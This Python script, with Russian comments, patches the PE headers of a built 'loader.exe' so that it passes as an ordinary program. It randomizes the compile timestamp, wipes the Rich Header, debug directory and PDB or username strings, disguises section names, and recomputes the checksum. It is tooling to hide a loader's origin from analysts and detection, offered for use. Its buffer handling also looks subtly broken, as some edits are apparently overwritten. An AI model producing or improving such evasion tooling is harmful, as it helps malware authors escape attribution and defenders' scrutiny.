# core/pe_patcher.py
# Патчинг PE-заголовков собранного loader.exe:
#   - рандомизация TimeDateStamp
#   - затирание Rich Header
#   - удаление Debug Directory и PDB path
#   - переименование секций
#   - пересчёт checksum

import os
import sys
import struct
import random
import hashlib
from pathlib import Path

try:
    import pefile
except ImportError:
    print("[!] pefile not installed. Run: pip install pefile")
    sys.exit(1)


# Нейтральные имена секций — как у обычных программ
SECTION_NAMES = {
    ".text":  ".text",
    ".rdata": ".rdata",
    ".data":  ".data",
    ".pdata": ".pdata",
    ".xdata": ".xdata",
    ".bss":   ".bss",
    ".idata": ".rdata",   # маскируем .idata под .rdata
    ".reloc": ".reloc",
    ".tls":   ".tls",
    ".rsrc":  ".rsrc",
}

# "Правдоподобные" компиляторы — MSVC под разными версиями
# TimeDateStamp — рандом между этими датами
DATE_MIN = 1577836800   # 2020-01-01
DATE_MAX = 1735689600   # 2025-01-01


def random_timestamp() -> int:
    """Случайный timestamp в правдоподобном диапазоне."""
    return random.randint(DATE_MIN, DATE_MAX)


def strip_rich_header(data: bytearray, pe: pefile.PE) -> int:
    """
    Найти и затереть Rich Header.
    Rich Header — между DOS stub и NT headers, начинается с 'Rich' signature.
    Затираем 0x00.
    """
    # Rich Header идёт ПОСЛЕ DOS stub и ДО 'PE\0\0'
    # Ищем 'Rich' signature в первых 512 байтах
    rich_pos = data.find(b"Rich", 0, 0x200)
    if rich_pos == -1:
        return 0

    # Rich Header — 4 байта 'Rich' + 4 байта ключа, потом идут
    # зашифрованные XOR-ом записи (обычно ~0x80-0x100 байт вперёд)
    # Затираем от начала Rich Header до начала NT Headers

    # NT Headers начинается с 'PE\0\0' — ищем
    pe_pos = data.find(b"PE\x00\x00", 0, 0x400)
    if pe_pos == -1:
        return 0

    # Затираем всё между DOS stub и PE signature (кроме e_lfanew — он нужен)
    # DOS stub обычно до 0x40, потом Rich header
    # Поле e_lfanew находится по смещению 0x3C (4 байта) и указывает на PE

    e_lfanew = struct.unpack_from("<I", data, 0x3C)[0]

    # Затираем от 0x40 до e_lfanew
    for i in range(0x40, e_lfanew):
        data[i] = 0

    return 1


def rename_sections(pe: pefile.PE) -> int:
    """Переименовать секции в нейтральные имена."""
    count = 0
    for section in pe.sections:
        name = section.Name.rstrip(b"\x00").decode("ascii", "ignore")
        new_name = SECTION_NAMES.get(name)
        if new_name and new_name != name:
            section.Name = new_name.encode("ascii").ljust(8, b"\x00")[:8]
            count += 1
    return count


def strip_debug_directory(pe: pefile.PE) -> int:
    """Обнулить Debug Directory."""
    if not hasattr(pe, "DIRECTORY_ENTRY_DEBUG"):
        return 0
    count = len(pe.DIRECTORY_ENTRY_DEBUG)
    # Просто обнуляем DataDirectory[6] (DEBUG)
    pe.OPTIONAL_HEADER.DATA_DIRECTORY[6].VirtualAddress = 0
    pe.OPTIONAL_HEADER.DATA_DIRECTORY[6].Size = 0
    return count


def strip_pdb_path(data: bytearray) -> int:
    """Найти и затереть пути к .pdb."""
    count = 0
    patterns = [b".pdb", b".PDB", b"\\Users\\", b"/Users/", b"ronin"]
    for pat in patterns:
        pos = 0
        while True:
            idx = data.find(pat, pos)
            if idx == -1:
                break
            # Найти начало строки (идём назад до 0x00)
            start = idx
            while start > 0 and data[start - 1] >= 32 and data[start - 1] < 127:
                start -= 1
            # Найти конец строки (вперёд до 0x00)
            end = idx
            while end < len(data) - 1 and data[end] >= 32 and data[end] < 127:
                end += 1
            # Затираем
            for i in range(start, end):
                data[i] = 0
            count += 1
            pos = end + 1
    return count


def recalc_checksum(pe: pefile.PE) -> int:
    """Пересчитать PE checksum."""
    return pe.generate_checksum()


def patch(input_path: str, output_path: str = None, verbose: bool = True,
          randomize_timestamp: bool = True,
          rename_sections_flag: bool = True,
          strip_rich: bool = True,
          strip_pdb: bool = True) -> bool:
    if output_path is None:
        output_path = input_path

    if verbose:
        print(f"[*] Patching PE: {input_path}")

    with open(input_path, "rb") as f:
        data = bytearray(f.read())

    if verbose:
        print(f"    Original size: {len(data)} bytes")

    pe = pefile.PE(data=data, fast_load=False)

    # 1. TimeDateStamp
    if randomize_timestamp:
        old_ts = pe.FILE_HEADER.TimeDateStamp
        new_ts = random_timestamp()
        pe.FILE_HEADER.TimeDateStamp = new_ts
        if verbose:
            print(f"    TimeDateStamp: {old_ts} -> {new_ts}")

    # 2. Rich Header
    if strip_rich:
        rich = strip_rich_header(data, pe)
        if verbose:
            print(f"    Rich Header stripped: {rich}")

    # 3. Section names
    if rename_sections_flag:
        renamed = rename_sections(pe)
        if verbose:
            print(f"    Sections renamed: {renamed}")

    # 4. Debug Directory
    dbg = strip_debug_directory(pe)
    if verbose:
        print(f"    Debug entries removed: {dbg}")

    # 5. PDB path
    if strip_pdb:
        pdb = strip_pdb_path(data)
        if verbose:
            print(f"    PDB paths erased: {pdb}")

    # 6. Применяем
    data = bytearray(pe.write())
    pe.close()

    # 7. Checksum
    pe = pefile.PE(data=bytes(data), fast_load=False)
    new_checksum = pe.generate_checksum()
    pe.OPTIONAL_HEADER.CheckSum = new_checksum
    data = bytearray(pe.write())
    pe.close()

    if verbose:
        print(f"    Checksum: {new_checksum:#x}")
        print(f"    New size: {len(data)} bytes")

    with open(output_path, "wb") as f:
        f.write(data)

    if verbose:
        print(f"[+] Patched: {output_path}")
        print(f"    SHA256: {hashlib.sha256(data).hexdigest()}")

    return True


def main():
    if len(sys.argv) < 2:
        print("Usage: python pe_patcher.py <loader.exe> [output.exe]")
        sys.exit(1)

    input_path = sys.argv[1]
    output_path = sys.argv[2] if len(sys.argv) > 2 else None

    if not os.path.exists(input_path):
        print(f"[!] File not found: {input_path}")
        sys.exit(1)

    if not patch(input_path, output_path):
        sys.exit(1)


if __name__ == "__main__":
    main()